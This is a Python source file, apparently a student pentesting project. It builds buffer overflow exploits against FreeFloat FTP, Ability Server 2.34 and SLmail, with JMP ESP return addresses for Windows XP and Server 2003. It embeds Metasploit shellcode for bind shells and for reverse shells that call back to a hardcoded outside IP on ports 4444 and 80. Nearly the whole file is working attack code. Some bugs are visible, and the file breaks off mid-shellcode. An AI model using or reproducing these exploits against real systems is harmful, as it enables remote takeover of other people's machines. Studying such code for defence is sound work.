#!/usr/bin/python
########################## Exploit Class 
########################## Jonathan OBrien
########################## Waterford Institute of technology




############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
                                         #~~~~~      Basic Custom Exploit SYSTEM     ~~~~~#
                                         ###################################################
                                         
                                         # Since Metaplsoit is so slow to load on the PI
                                         # Wrote simular funtionality at basic level
                                         # Using Windows XP box and
                                         # Immunity debugger and python for Fuzzing and Analysis
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
import socket, struct , os 



class exploit:

    ## Banner grabbing help from "Violent Python"
    ## Ability Explit created for the "penetration testing with backtrack" course i took
    ## with offensive security 
    ## other explits found on Exploit database
    ## Fuzzeed again against my service installations and with custom code and Immunity debugger
    ## customized shell code with invalid characters removed 
    
    
    
    ## Constructor (python equivilant anyways)
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        
    ### State variables
    banner = None
    isVuln = False    
    id = 0
    
    
     
    
    def retBanner(self):
        ## Try connecting to selected target IP and Service Port
        ## and recieving the banner for that service if it exists 
        try:
            socket.setdefaulttimeout(2)
            s = socket.socket()
            s.connect((self.ip, self.port))
            ban = s.recv(1024)
            self.banner = ban
            return ban
        except:
            self.banner = "no Banner"
            return "No Banner"
    
    
    ### Check the Banner for matching known vunrabile Service   
    def checkV(self):
        if 'FreeFloat Ftp Server (Version 1.00)' in self.banner:
            print '[+] FreeFloat FTP Server is vulnerable.'
            self.id = 1
            isVuln = True
            return 1
        
        elif '3Com 3CDaemon FTP Server Version 2.0' in self.banner:
            print '[+] 3CDaemon FTP Server is vulnerable.'
            self.id = 2
            isVuln = True
            return 2
        
        elif 'Ability Server 2.34' in self.banner:
            print '[+] Ability FTP Server is vulnerable.'
            self.id = 3
            isVuln = True
            return 3
        
        elif '+OK POP3 server' in self.banner:
            print '[+] SLmail is vulnerable.'
            self.id = 4
            isVuln = True
            return 4        
        
        else:
            self.id = 0
            isVuln = False
            return '[-] FTP Server is not vulnerable.'
    
    
    
    
    ### Abilty Server 2.34 FTP expoit code
    #######################################
    #######################################
    
    def ability_ftp(self, OS, payload_type):
        
        
        ## OS specific Return addresses for the Assembly (JMP ESP) Jump stack pointer command
        ## These are in Windows DLL's which are assigned the same memory address on every Windows Boot
        ## used in method to circumvent ASLR (address space layout randomization)
        RET_WINXPPRO_SP3 = '\x53\x93\x42\x7e'
        RET_WINXPPRO_SP2 = '\x0A\xAF\xD8\x77'
        RET_WINSERVER_03_STAN = "\x38\x07\xd2\x77"
        
        ## create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        #pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
        
        
        
        ### Shellcode )exploiit code in HEX
        ### generate a binding or rervse Shell for remote connection on the remote service
        
        #/* win32_reverse -  EXITFUNC=seh LHOST=54.72.28.175 LPORT=4444 Size=312 Encoder=PexFnstenvSub http://metasploit.com */
        reverse_shell = ("\x33\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf1"
        "\xa9\xee\x12\x83\xeb\xfc\xe2\xf4\x0d\xc3\x05\x5f\x19\x50\x11\xed"
        "\x0e\xc9\x65\x7e\xd5\x8d\x65\x57\xcd\x22\x92\x17\x89\xa8\x01\x99"
        "\xbe\xb1\x65\x4d\xd1\xa8\x05\x5b\x7a\x9d\x65\x13\x1f\x98\x2e\x8b"
        "\x5d\x2d\x2e\x66\xf6\x68\x24\x1f\xf0\x6b\x05\xe6\xca\xfd\xca\x3a"
        "\x84\x4c\x65\x4d\xd5\xa8\x05\x74\x7a\xa5\xa5\x99\xae\xb5\xef\xf9"
        "\xf2\x85\x65\x9b\x9d\x8d\xf2\x73\x32\x98\x35\x76\x7a\xea\xde\x99"
        "\xb1\xa5\x65\x62\xed\x04\x65\x52\xf9\xf7\x86\x9c\xbf\xa7\x02\x42"
        "\x0e\x7f\x88\x41\x97\xc1\xdd\x20\x99\xde\x9d\x20\xae\xfd\x11\xc2"
        "\x99\x62\x03\xee\xca\xf9\x11\xc4\xae\x20\x0b\x74\x70\x44\xe6\x10"
        "\xa4\xc3\xec\xed\x21\xc1\x37\x1b\x04\x04\xb9\xed\x27\xfa\xbd\x41"
        "\xa2\xea\xbd\x51\xa2\x56\x3e\x7a\xc7\xe1\xf2\xbd\x97\xc1\xff\x4e"
        "\x97\xfa\x67\xf3\x64\xc1\x02\xeb\x5b\xc9\xb9\xed\x27\xc3\xfe\x43"
        "\xa4\x56\x3e\x74\x9b\xcd\x88\x7a\x92\xc4\x84\x42\xa8\x80\x22\x9b"
        "\x16\xc3\xaa\x9b\x13\x98\x2e\xe1\x5b\x3c\x67\xef\x0f\xeb\xc3\xec"
        "\xb3\x85\x63\x68\xc9\x02\x45\xb9\x99\xdb\x10\xa1\xe7\x56\x9b\x3a"
        "\x0e\x7f\xb5\x45\xa3\xf8\xbf\x43\x9b\xa8\xbf\x43\xa4\xf8\x11\xc2"
        "\x99\x04\x37\x17\x3f\xfa\x11\xc4\x9b\x56\x11\x25\x0e\x79\x86\xf5"
        "\x88\x6f\x97\xed\x84\xad\x11\xc4\x0e\xde\x12\xed\x21\xc1\x1e\x98"
        "\xf5\xf6\xbd\xed\x27\x56\x3e\x12")
        
        ## win32_reverse -  EXITFUNC=seh LHOST=54.72.28.175 LPORT=80 Size=312 Encoder=PexFnstenvSub http://metasploit.com */
        rev_port80 = ("\x29\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x17"
        "\xea\x6b\xc0\x83\xeb\xfc\xe2\xf4\xeb\x80\x80\x8d\xff\x13\x94\x3f"
        "\xe8\x8a\xe0\xac\x33\xce\xe0\x85\x2b\x61\x17\xc5\x6f\xeb\x84\x4b"
        "\x58\xf2\xe0\x9f\x37\xeb\x80\x89\x9c\xde\xe0\xc1\xf9\xdb\xab\x59"
        "\xbb\x6e\xab\xb4\x10\x2b\xa1\xcd\x16\x28\x80\x34\x2c\xbe\x4f\xe8"
        "\x62\x0f\xe0\x9f\x33\xeb\x80\xa6\x9c\xe6\x20\x4b\x48\xf6\x6a\x2b"
        "\x14\xc6\xe0\x49\x7b\xce\x77\xa1\xd4\xdb\xb0\xa4\x9c\xa9\x5b\x4b"
        "\x57\xe6\xe0\xb0\x0b\x47\xe0\x80\x1f\xb4\x03\x4e\x59\xe4\x87\x90"
        "\xe8\x3c\x0d\x93\x71\x82\x58\xf2\x7f\x9d\x18\xf2\x48\xbe\x94\x10"
        "\x7f\x21\x86\x3c\x2c\xba\x94\x16\x48\x63\x8e\xa6\x96\x07\x63\xc2"
        "\x42\x80\x69\x3f\xc7\x82\xb2\xc9\xe2\x47\x3c\x3f\xc1\xb9\x38\x93"
        "\x44\xa9\x38\x83\x44\x15\xbb\xa8\x21\xa2\x77\x6f\x71\x82\x6b\x90"
        "\x71\xb9\xe2\x21\x82\x82\x87\x39\xbd\x8a\x3c\x3f\xc1\x80\x7b\x91"
        "\x42\x15\xbb\xa6\x7d\x8e\x0d\xa8\x74\x87\x01\x90\x4e\xc3\xa7\x49"
        "\xf0\x80\x2f\x49\xf5\xdb\xab\x33\xbd\x7f\xe2\x3d\xe9\xa8\x46\x3e"
        "\x55\xc6\xe6\xba\x2f\x41\xc0\x6b\x7f\x98\x95\x73\x01\x15\x1e\xe8"
        "\xe8\x3c\x30\x97\x45\xbb\x3a\x91\x7d\xeb\x3a\x91\x42\xbb\x94\x10"
        "\x7f\x47\xb2\xc5\xd9\xb9\x94\x16\x7d\x15\x94\xf7\xe8\x3a\x03\x27"
        "\x6e\x2c\x12\x3f\x62\xee\x94\x16\xe8\x9d\x97\x3f\xc7\x82\x9b\x4a"
        "\x13\xb5\x38\x3f\xc1\x15\xbb\xc0")
    
        ##/* win32_reverse -  EXITFUNC=thread LHOST=54.72.28.175 LPORT=4444 Size=312 Encoder=PexFnstenvSub http://metasploit.com */
        reverse_shell2 = ("\x29\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x13"
        "\xf4\xc4\xb0\x83\xeb\xfc\xe2\xf4\xef\x9e\x2f\xfd\xfb\x0d\x3b\x4f"
        "\xec\x94\x4f\xdc\x37\xd0\x4f\xf5\x2f\x7f\xb8\xb5\x6b\xf5\x2b\x3b"
        "\x5c\xec\x4f\xef\x33\xf5\x2f\xf9\x98\xc0\x4f\xb1\xfd\xc5\x04\x29"
        "\xbf\x70\x04\xc4\x14\x35\x0e\xbd\x12\x36\x2f\x44\x28\xa0\xe0\x98"
        "\x66\x11\x4f\xef\x37\xf5\x2f\xd6\x98\xf8\x8f\x3b\x4c\xe8\xc5\x5b"
        "\x10\xd8\x4f\x39\x7f\xd0\xd8\xd1\xd0\xc5\x1f\xd4\x98\xb7\xf4\x3b"
        "\x53\xf8\x4f\xc0\x0f\x59\x4f\xf0\x1b\xaa\xac\x3e\x5d\xfa\x28\xe0"
        "\xec\x22\xa2\xe3\x75\x9c\xf7\x82\x7b\x83\xb7\x82\x4c\xa0\x3b\x60"
        "\x7b\x3f\x29\x4c\x28\xa4\x3b\x66\x4c\x7d\x21\xd6\x92\x19\xcc\xb2"
        "\x46\x9e\xc6\x4f\xc3\x9c\x1d\xb9\xe6\x59\x93\x4f\xc5\xa7\x97\xe3"
        "\x40\xb7\x97\xf3\x40\x0b\x14\xd8\x19\xf4\xc4\xb1\x75\x9c\xd5\xec"
        "\x75\xa7\x4d\x51\x86\x9c\x28\x49\xb9\x94\x93\x4f\xc5\x9e\xd4\xe1"
        "\x46\x0b\x14\xd6\x79\x90\xa2\xd8\x70\x99\xae\xe0\x4a\xdd\x08\x39"
        "\xf4\x9e\x80\x39\xf1\xc5\x04\x43\xb9\x61\x4d\x4d\xed\xb6\xe9\x4e"
        "\x51\xd8\x49\xca\x2b\x5f\x6f\x1b\x7b\x86\x3a\x03\x05\x0b\xb1\x98"
        "\xec\x22\x9f\xe7\x41\xa5\x95\xe1\x79\xf5\x95\xe1\x46\xa5\x3b\x60"
        "\x7b\x59\x1d\xb5\xdd\xa7\x3b\x66\x79\x0b\x3b\x87\xec\x24\xac\x57"
        "\x6a\x32\xbd\x4f\x66\xf0\x3b\x66\xec\x83\x38\x4f\xc3\x9c\x34\x3a"
        "\x17\xab\x97\x4f\xc5\x0b\x14\xb0")
        
        # shellcode 344 bytes, Bind 4444
        bind_shell = ("\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x21"
        "\xd3\xd2\xac\x83\xeb\xfc\xe2\xf4\xdd\xb9\x39\xe1\xc9\x2a\x2d\x53"
        "\xde\xb3\x59\xc0\x05\xf7\x59\xe9\x1d\x58\xae\xa9\x59\xd2\x3d\x27"
        "\x6e\xcb\x59\xf3\x01\xd2\x39\xe5\xaa\xe7\x59\xad\xcf\xe2\x12\x35"
        "\x8d\x57\x12\xd8\x26\x12\x18\xa1\x20\x11\x39\x58\x1a\x87\xf6\x84"
        "\x54\x36\x59\xf3\x05\xd2\x39\xca\xaa\xdf\x99\x27\x7e\xcf\xd3\x47"
        "\x22\xff\x59\x25\x4d\xf7\xce\xcd\xe2\xe2\x09\xc8\xaa\x90\xe2\x27"
        "\x61\xdf\x59\xdc\x3d\x7e\x59\xec\x29\x8d\xba\x22\x6f\xdd\x3e\xfc"
        "\xde\x05\xb4\xff\x47\xbb\xe1\x9e\x49\xa4\xa1\x9e\x7e\x87\x2d\x7c"
        "\x49\x18\x3f\x50\x1a\x83\x2d\x7a\x7e\x5a\x37\xca\xa0\x3e\xda\xae"
        "\x74\xb9\xd0\x53\xf1\xbb\x0b\xa5\xd4\x7e\x85\x53\xf7\x80\x81\xff"
        "\x72\x80\x91\xff\x62\x80\x2d\x7c\x47\xbb\xc3\xf0\x47\x80\x5b\x4d"
        "\xb4\xbb\x76\xb6\x51\x14\x85\x53\xf7\xb9\xc2\xfd\x74\x2c\x02\xc4"
        "\x85\x7e\xfc\x45\x76\x2c\x04\xff\x74\x2c\x02\xc4\xc4\x9a\x54\xe5"
        "\x76\x2c\x04\xfc\x75\x87\x87\x53\xf1\x40\xba\x4b\x58\x15\xab\xfb"
        "\xde\x05\x87\x53\xf1\xb5\xb8\xc8\x47\xbb\xb1\xc1\xa8\x36\xb8\xfc"
        "\x78\xfa\x1e\x25\xc6\xb9\x96\x25\xc3\xe2\x12\x5f\x8b\x2d\x90\x81"
        "\xdf\x91\xfe\x3f\xac\xa9\xea\x07\x8a\x78\xba\xde\xdf\x60\xc4\x53"
        "\x54\x97\x2d\x7a\x7a\x84\x80\xfd\x70\x82\xb8\xad\x70\x82\x87\xfd"
        "\xde\x03\xba\x01\xf8\xd6\x1c\xff\xde\x05\xb8\x53\xde\xe4\x2d\x7c"
        "\xaa\x84\x2e\x2f\xe5\xb7\x2d\x7a\x73\x2c\x02\xc4\xce\x1d\x32\xcc"
        "\x72\x2c\x04\x53\xf1\xd3\xd2\xac")
       
        payload = ""

        if payload_type == "reverse":
            payload = reverse_shell
            print "use rev"
            
        elif payload_type == "port80":
            payload = rev_port80
            print "use amazon port 80 reverse shell"
            
        elif payload_type == "bind":
            payload = bind_shell
            print "do bind"
            
        
        if OS == "WIN_XP_SP3":
            RET = RET_WINXPPRO_SP3
        elif OS == "WIN_XP_SP2":
            RET = RET_WINXPPRO_SP2
        elif OS == "WIN_SERV_03_STAN":
            RET = RET_WINSERVER_03_STAN
            
        
        
        
        ##### COMMAND hard set for Abilty server
        ##### but could be chnaged for other exploits
        cmd = "APPE "
        
        
        ## I think the Offset is changing Based on the file Location of the installation of Ability FTP
        ## Used to be a 967 byte lead up to the EIP address
        ## had to use immunity debugger to Rectifyt the EIP location for the JMP ESP address
        #971
        
        ## 971 A's lead up the the EIP register address
        ## giving the EIP instrution pointer the Return memory adress of
        ##  a JMP ESP command in a windows DLL USER32.DLL,,,, Hence the OS version of
        ## this address (changed to Little endian)
        ## this  makes the execution JUMP to the STACK POINTER LOCATION ESP
        ## This is where the shellcode will reside afteR  a NOP slide ( no operation) to
        ## get there
        
        buffer =  '\x41' * 971 +  RET + '\x90' * 16 + '\x90' * 16 + payload + '\xcc' * 681
    
        print "\nSending eXPLOIt..." 
        s.connect((self.ip, self.port))
        data = s.recv(1024)
        s.send('USER ftp' +'\r\n')
        data = s.recv(1024)
        s.send('PASS ftp' +'\r\n')
        data = s.recv(1024)
        ### Send payload to vunrabile command 
        s.send(cmd + buffer +'\r\n')
        s.close()
        
        
        
    
    #def check(banner):
    #    global isVuln
    #    banner = retBanner(ip, port)
    #    if banner:
    #        print '[+] ' + ip  +': ' +banner.strip('\n')
    #        isVuln = checkV(banner)
    #    
    #    if isVuln == 3:
    #        return ability       
    #
    #    elif isVuln == 4:
    #        return sami
    
        
    
    #
    #if __name__ == "__main__":
    #    main()
    
    
    def freefloat_ftp(self, OS, payload_type):
                
        
        
        ## For Reverse Shell to Work i had to Make the Exit Funtion a "Process" in Metasploit Shellcode generator
        ## * win32_reverse -  EXITFUNC=process LHOST=54.72.28.175 LPORT=4444 Size=312 Encoder=PexFnstenvSub http://metasploit.com */
        reverse_shell = ("\x29\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7d"
        "\xb1\x1e\xd4\x83\xeb\xfc\xe2\xf4\x81\xdb\xf5\x99\x95\x48\xe1\x2b"
        "\x82\xd1\x95\xb8\x59\x95\x95\x91\x41\x3a\x62\xd1\x05\xb0\xf1\x5f"
        "\x32\xa9\x95\x8b\x5d\xb0\xf5\x9d\xf6\x85\x95\xd5\x93\x80\xde\x4d"
        "\xd1\x35\xde\xa0\x7a\x70\xd4\xd9\x7c\x73\xf5\x20\x46\xe5\x3a\xfc"
        "\x08\x54\x95\x8b\x59\xb0\xf5\xb2\xf6\xbd\x55\x5f\x22\xad\x1f\x3f"
        "\x7e\x9d\x95\x5d\x11\x95\x02\xb5\xbe\x80\xc5\xb0\xf6\xf2\x2e\x5f"
        "\x3d\xbd\x95\xa4\x61\x1c\x95\x94\x75\xef\x76\x5a\x33\xbf\xf2\x84"
        "\x82\x67\x78\x87\x1b\xd9\x2d\xe6\x15\xc6\x6d\xe6\x22\xe5\xe1\x04"
        "\x15\x7a\xf3\x28\x46\xe1\xe1\x02\x22\x38\xfb\xb2\xfc\x5c\x16\xd6"
        "\x28\xdb\x1c\x2b\xad\xd9\xc7\xdd\x88\x1c\x49\x2b\xab\xe2\x4d\x87"
        "\x2e\xf2\x4d\x97\x2e\x4e\xce\xbc\x4b\xf9\x02\x7b\x1b\xd9\x0f\x88"
        "\x1b\xe2\x97\x35\xe8\xd9\xf2\x2d\xd7\xd1\x49\x2b\xab\xdb\x0e\x85"
        "\x28\x4e\xce\xb2\x17\xd5\x78\xbc\x1e\xdc\x74\x84\x24\x98\xd2\x5d"
        "\x9a\xdb\x5a\x5d\x9f\x80\xde\x27\xd7\x24\x97\x29\x83\xf3\x33\x2a"
        "\x3f\x9d\x93\xae\x45\x1a\xb5\x7f\x15\xc3\xe0\x67\x6b\x4e\x6b\xfc"
        "\x82\x67\x45\x83\x2f\xe0\x4f\x85\x17\xb0\x4f\x85\x28\xe0\xe1\x04"
        "\x15\x1c\xc7\xd1\xb3\xe2\xe1\x02\x17\x4e\xe1\xe3\x82\x61\x76\x33"
        "\x04\x77\x67\x2b\x08\xb5\xe1\x02\x82\xc6\xe2\x2b\xad\xd9\x60\x0c"
        "\x9f\xc2\x4d\x2b\xab\x4e\xce\xd4")
        
        
        ##/*#open listener shell on port 4444
        bind_shell = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
        bind_shell += "\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
        bind_shell += "\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"
        bind_shell += "\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"
        bind_shell += "\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"
        bind_shell += "\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
        bind_shell += "\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
        bind_shell += "\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
        bind_shell += "\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
        bind_shell += "\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
        bind_shell += "\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
        bind_shell += "\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
        bind_shell += "\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
        bind_shell += "\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
        bind_shell += "\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
        bind_shell += "\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
        bind_shell += "\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
        bind_shell += "\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
        bind_shell += "\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
        bind_shell += "\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
        bind_shell += "\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
        bind_shell += "\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
        bind_shell += "\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
        bind_shell += "\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
        bind_shell += "\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"
        
    
        
        
        ### 246
        #### Offset off by ne byte, checked EIP over write in Win
        padding = "A"*246
        
        ### No OPERATION (NOP) slide
        sled = "\x90"*20
        
        ### WINXP SP3 7E429353   FFE4             JMP ESP
        ### WINXP SP2 7C941EED   FFE4             JMP ESP
        
        ## struct will reverse the 32 bit hex Retrunr address for Little Endian format
        ## very handy, had not known that this existed 
        RET_WINXPPRO_SP2 = struct.pack('<L',0x7C941EED)
        #RET_WINXPPRO_SP2 = '\x0A\xAF\xD8\x77'

        RET_WINXPPRO_SP3 = struct.pack('<L',0x7E429353)
        RET_WINSERVER_03_STAN = "\x38\x07\xd2\x77"
        
        if payload_type == "reverse":
            payload = reverse_shell
            print "use rev"
            
        elif payload_type == "port80":
            payload = rev_port80
            print "use amazon port 80 reverse shell"
            
        elif payload_type == "bind":
            payload = bind_shell
            print "do bind"
            
        
        if OS == "WIN_XP_SP3":
            RET = RET_WINXPPRO_SP3
            
        elif OS == "WIN_XP_SP2":
            RET = RET_WINXPPRO_SP2
            
        elif OS == "WIN_SERV_03_STAN":
            RET = RET_WINSERVER_03_STAN
        
        buffer = padding + RET + sled + payload
        
        s = socket(AF_INET,SOCK_STREAM)
        s.connect((self.ip,self.port))
        s.recv(1024)
        s.send("USER test\r\n")
        s.recv(1024)
        s.send("PASS test\r\n")
        s.recv(1024)
        s.send("ACCL "+ buffer +"\r\n")
        s.close()

    def slmail(self, OS, payload_type):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        ## address of JMP esp IN USER32.dll
        ## 77D8AF0A   FFE4             JMP ESP
        
        
        ## Breakpoint \xcc     dubugger pause
        
        # needs space between encoded shellcode
        ## needs space before to be decoded
        ## add 16 nops
        
        ##  344
        bind_shell =("\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x22"
        "\x47\x12\xb0\x83\xeb\xfc\xe2\xf4\xde\x2d\xf9\xfd\xca\xbe\xed\x4f"
        "\xdd\x27\x99\xdc\x06\x63\x99\xf5\x1e\xcc\x6e\xb5\x5a\x46\xfd\x3b"
        "\x6d\x5f\x99\xef\x02\x46\xf9\xf9\xa9\x73\x99\xb1\xcc\x76\xd2\x29"
        "\x8e\xc3\xd2\xc4\x25\x86\xd8\xbd\x23\x85\xf9\x44\x19\x13\x36\x98"
        "\x57\xa2\x99\xef\x06\x46\xf9\xd6\xa9\x4b\x59\x3b\x7d\x5b\x13\x5b"
        "\x21\x6b\x99\x39\x4e\x63\x0e\xd1\xe1\x76\xc9\xd4\xa9\x04\x22\x3b"
        "\x62\x4b\x99\xc0\x3e\xea\x99\xf0\x2a\x19\x7a\x3e\x6c\x49\xfe\xe0"
        "\xdd\x91\x74\xe3\x44\x2f\x21\x82\x4a\x30\x61\x82\x7d\x13\xed\x60"
        "\x4a\x8c\xff\x4c\x19\x17\xed\x66\x7d\xce\xf7\xd6\xa3\xaa\x1a\xb2"
        "\x77\x2d\x10\x4f\xf2\x2f\xcb\xb9\xd7\xea\x45\x4f\xf4\x14\x41\xe3"
        "\x71\x14\x51\xe3\x61\x14\xed\x60\x44\x2f\x03\xec\x44\x14\x9b\x51"
        "\xb7\x2f\xb6\xaa\x52\x80\x45\x4f\xf4\x2d\x02\xe1\x77\xb8\xc2\xd8"
        "\x86\xea\x3c\x59\x75\xb8\xc4\xe3\x77\xb8\xc2\xd8\xc7\x0e\x94\xf9"
        "\x75\xb8\xc4\xe0\x76\x13\x47\x4f\xf2\xd4\x7a\x57\x5b\x81\x6b\xe7"
        "\xdd\x91\x47\x4f\xf2\x21\x78\xd4\x44\x2f\x71\xdd\xab\xa2\x78\xe0"
        "\x7b\x6e\xde\x39\xc5\x2d\x56\x39\xc0\x76\xd2\x43\x88\xb9\x50\x9d"
